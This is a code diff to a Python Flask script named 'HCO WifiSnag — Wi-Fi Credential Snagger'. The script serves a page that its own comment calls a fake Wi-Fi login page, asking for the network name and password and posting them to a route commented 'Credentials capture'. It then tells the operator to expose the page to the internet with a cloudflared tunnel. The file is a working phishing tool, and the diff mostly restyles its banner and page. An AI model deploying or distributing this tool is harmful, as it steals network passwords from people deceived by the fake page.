@@ -4,15 +4,32 @@ import time
 
 app = Flask(__name__)
 
-# YouTube Redirect (works in Termux)
+# 🔁 YouTube redirect with stylish banner
 def redirect_to_youtube():
-    print("\n\033[1;32m[!] This tool is not free!\033[0m")
-    print("\033[1;33m[>] Redirecting to our YouTube channel in 10 seconds...\033[0m")
+    os.system("clear")
+    banner = '''
+\033[1;32m╭──────────────────────────────────────────────────────────────╮
+│                                                              │
+│        \033[1;31m██╗  ██╗ ██████╗   █████╗  ███████╗                       \033[1;32m│
+│        \033[1;31m██║  ██║██╔═══██╗ ██╔══██╗ ██╔════╝                       \033[1;32m│
+│        \033[1;31m███████║██║   ██║ ███████║ █████╗                         \033[1;32m│
+│        \033[1;31m██╔══██║██║   ██║ ██╔══██║ ██╔══╝                         \033[1;32m│
+│        \033[1;31m██║  ██║╚██████╔╝ ██║  ██║ ███████╗                       \033[1;32m│
+│        \033[1;31m╚═╝  ╚═╝ ╚═════╝  ╚═╝  ╚═╝ ╚══════╝                       \033[1;32m│
+│                                                              │
+│         \033[1;31m[ HCO WifiSnag — Wi-Fi Credential Snagger ]\033[1;32m       │
+│                                                              │
+│   \033[1;33m[!] This tool is not free. Subscribe to continue.           \033[1;32m│
+│   \033[1;36m[>] Redirecting to Hackers Colony YouTube in 10 seconds... \033[1;32m│
+│                                                              │
+╰──────────────────────────────────────────────────────────────╯
+'''
+    print(banner)
     time.sleep(10)
     os.system("termux-open-url https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya")
     input("\n\033[1;32m[✔] After subscribing, press Enter to continue...\033[0m\n")
 
-# WiFi Login Page HTML
+# 🌐 Fake Wi-Fi login page HTML
 login_page = '''
 <!DOCTYPE html>
 <html>
@@ -20,11 +37,11 @@ login_page = '''
     <title>Wi-Fi Login</title>
     <style>
         body {
-            background-color: #111;
+            background-color: #000;
             color: white;
             font-family: monospace;
             text-align: center;
-            padding-top: 100px;
+            padding-top: 80px;
         }
         input {
             padding: 10px;
@@ -44,18 +61,18 @@ login_page = '''
             border-radius: 5px;
         }
         .box {
-            background-color: #222;
+            background-color: #111;
             padding: 30px;
-            width: 300px;
+            width: 320px;
             margin: auto;
             border-radius: 10px;
-            box-shadow: 0px 0px 20px red;
+            box-shadow: 0px 0px 20px lime;
         }
     </style>
 </head>
 <body>
     <div class="box">
-        <h2>Connect to Free Wi-Fi</h2>
+        <h2>Connect to Wi-Fi</h2>
         <form method="POST" action="/login">
             <input type="text" name="ssid" placeholder="Wi-Fi Name (SSID)" required><br>
             <input type="password" name="password" placeholder="Wi-Fi Password" required><br>
@@ -66,10 +83,12 @@ login_page = '''
 </html>
 '''
 
+# 📥 Home page
 @app.route('/')
 def index():
     return render_template_string(login_page)
 
+# 📦 Credentials capture
 @app.route('/login', methods=['POST'])
 def login():
     ssid = request.form.get('ssid')
@@ -84,8 +103,10 @@ def login():
     Thank you! Connecting to Wi-Fi...</h2>
     '''
 
+# 🚀 Main run
 if __name__ == '__main__':
     redirect_to_youtube()
-    print("\033[1;32m[✔] Flask server running on http://127.0.0.1:5000\033[0m")
-    print("\033[1;34m[>] Now run: cloudflared tunnel --url http://127.0.0.1:5000\033[0m\n")
-    app.run(host='0.0.0.0', port=5000)
+    print("\n\033[1;32m[✔] Flask server running on http://127.0.0.1:5000\033[0m")
+    print("\033[1;34m[>] Now open another tab and run:\033[0m")
+    print("\033[1;36m    cloudflared tunnel --url http://127.0.0.1:5000\033[0m\n")
+    app.run(host='127.0.0.1', port=5000)
